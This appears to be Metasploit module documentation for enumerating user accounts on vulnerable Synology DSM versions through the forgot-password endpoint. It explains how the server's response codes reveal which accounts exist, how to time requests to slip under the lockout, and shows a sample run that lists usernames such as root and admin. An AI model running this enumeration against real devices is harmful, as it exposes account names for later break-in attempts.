## Vulnerable Application

This module attempts to enumerate users on the Synology NAS by sending GET requests
for the forgot password URL. The Synology NAS will respond differently if a user is
present or not. These count as login attempts, and the default is 10 logins in 5min to
get a permanent block.  Set delay accordingly to avoid this, as default is permanent.

Vulnerable DSMs are:
 * DSM 6.1 < 6.1.3-15152
 * DSM 6.0 < 6.0.3-8754-4
 * DSM 5.2 < 5.2-5967-04

Enumeration is case insensitive.

To turn off Auto Block: Control Panel (Advanced Mode) > Security > Auto Block.

To unblock: Control Panel (Advanced Mode) > Security > Auto Block > Allow/Block List > Block List.

### Responses

The server responds with a JSON object and a 'msg' key.  The values translate as:

 * msg 1 - means user can login to GUI
 * msg 2 - means user exists but no GUI login
 * msg 3 - means feature disabled, or patched
 * msg 4 - means no user
 * msg 5 - means auto block is enabled and youre blocked. Default is 10 login attempts, and these

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/http/synology_forget_passwd_user_enum```
  4. Do: ```set rhosts [ip]```
  5. Do: ```set delay [seconds]```
  6. You should hopefully find some usernames

## Options

### Delay

The delay in seconds between enumeration attempts.  Default lockout policy is 10 attempts in 5min,
so this should avoid the lockout.  Default is `36`.

### USER_LIST

The username list to use, defaults to `data/wordlists/unix_users.txt`

## Scenarios

### DS412+ with DSM 5.2-5644 with auto block turned off

  ```
  [*] Processing syn_login.rb for ERB directives.
  resource (syn_login.rb)> use auxiliary/scanner/http/synology_forget_passwd_user_enum
  resource (syn_login.rb)> set rhosts 2.2.2.2
  rhosts => 2.2.2.2
  resource (syn_login.rb)> set delay 0
  delay => 0
  resource (syn_login.rb)> run
  [+] admin - admin group
  [+] avahi - no mail or no priviege
  [+] ftp - no mail or no priviege
  [+] guest - no mail or no priviege
  [+] lp - no mail or no priviege
  [+] mysql - no mail or no priviege
  [+] nobody - no mail or no priviege
  [+] ntp - no mail or no priviege
  [+] postfix - no mail or no priviege
  [+] postgres - no mail or no priviege
  [+] root - no mail or no priviege
  [+] ROOT - no mail or no priviege
  [+] http://2.2.2.2:5000/ - Users found: ROOT, admin, avahi, ftp, guest, lp, mysql, nobody, ntp, postfix, postgres, root
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```
